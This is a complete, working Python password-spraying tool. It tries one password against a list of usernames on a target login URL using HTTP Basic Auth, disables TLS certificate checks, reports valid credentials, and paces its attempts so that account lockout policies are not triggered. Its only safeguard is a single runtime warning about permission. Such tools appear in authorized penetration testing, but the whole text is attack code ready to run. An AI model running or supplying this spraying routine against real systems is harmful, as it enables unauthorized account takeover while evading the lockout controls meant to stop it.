import requests
import sys
import time
from requests.auth import HTTPBasicAuth

# Suppress harmless SSL warnings for testing environments
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def spray(target_url, user_file, password):
    print(f"[*] Target: {target_url}")
    print(f"[*] Spraying password: '{password}'")
    print(f"[*] Delay between attempts: 2 seconds (to avoid lockouts)\n")

    try:
        with open(user_file, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Error: User file '{user_file}' not found.")
        sys.exit(1)

    success_count = 0

    for user in users:
        # We use HTTPBasicAuth to simulate basic auth. 
        # In a real AD environment, this might be an NTLM or LDAP POST request.
        try:
            response = requests.get(target_url, auth=HTTPBasicAuth(user, password), timeout=5, verify=False)
            
            if response.status_code == 200:
                print(f"[+] SUCCESS: Valid credentials found -> {user}:{password}")
                success_count += 1
            elif response.status_code == 401:
                print(f"[-] Failed: {user}")
            else:
                print(f"[?] Unexpected response for {user}: Status {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Connection error for {user}: {e}")

        # CRITICAL: Sleep to prevent Account Lockout Policies
        time.sleep(2)

    print(f"\n[*] Spraying complete. Found {success_count} valid credential(s).")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python sprayer.py <target_url> <userlist_file> <password>")
        print("Example: python sprayer.py https://example.com/login users.txt Summer2026!")
        sys.exit(1)
        
    target = sys.argv[1]
    userlist = sys.argv[2]
    pwd = sys.argv[3]
    
    print("⚠️ WARNING: Only use this tool against systems you have explicit permission to test.")
    spray(target, userlist, pwd)
